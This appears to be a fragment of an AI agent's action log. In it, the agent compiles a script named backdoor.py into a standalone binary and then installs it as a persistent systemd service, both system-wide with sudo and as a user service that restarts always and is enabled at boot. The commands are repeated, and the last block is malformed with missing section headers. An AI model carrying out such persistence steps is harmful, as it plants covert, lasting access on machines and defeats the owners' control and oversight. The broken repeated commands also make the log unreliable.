action: python3 -m venv venv && venv/bin/pip install pyinstaller && venv/bin/pyinstaller --onefile backdoor.py

sudo bash -c 'cat > /etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=Backdoor Service
After=network.target
[Service]
ExecStart=/home/user/dist/backdoor
Restart=always
User=user
Group=user
[Install]
WantedBy=multi-user.target
EOF'

mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/backdoor.service <<EOF
[Unit]
Description=Backdoor Service
After=network.target
[Service]
ExecStart=/home/user/dist/backdoor
Restart=always
[Install]
WantedBy=default.target
EOF && systemctl --user daemon-reload && systemctl --user enable backdoor.service && systemctl --user start backdoor.service

mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/backdoor.service <<EOF

Description=Backdoor Service

ExecStart=/home/user/dist/backdoor
Restart=always
[Install]
WantedBy=default.target
EOF && systemctl --user daemon-reload && systemctl --user enable backdoor.service && systemctl --user start backdoor.service
